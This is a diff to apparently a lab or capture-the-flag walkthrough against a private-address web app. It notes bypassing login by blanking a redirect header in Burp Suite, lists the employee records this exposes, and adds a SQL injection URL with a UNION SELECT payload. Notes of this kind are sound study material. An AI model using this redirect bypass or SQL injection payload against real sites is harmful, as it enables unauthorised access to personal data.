@@ -240,7 +240,7 @@ if __name__ == "__main__":
 
 # remove location in response header
 
-![](image_25.png)
+![](image_25d.png)
 
 # arrived at 192.168.86.200/home.php
 
@@ -251,3 +251,23 @@ if __name__ == "__main__":
   3 Felisha Bookman 2006-03-12
   4 Natacha Pua 2007-11-24
   5 Chante Fenske 2007-12-28
+
+# set response Location: login.php -> "" in burpsuite
+
+![](image_27.png)
+
+![](image_28.png)
+![](image_29.png)
+
+- Id First name Last name Birth date Actions
+  6 Amado Grimaldi 2007-06-18
+  7 Valery Files 2007-03-08
+  8 Taryn Carbone 2007-08-01
+  9 Julissa Spengler 2007-01-31
+  10 Brain Spagnuolo 2007-09-23
+
+# try SQLI
+
+> http://192.168.86.200/home.php?action=search&first_name=%27+UNION+select+*+from+employees%27&last_name=
+
+![](image_30.png)
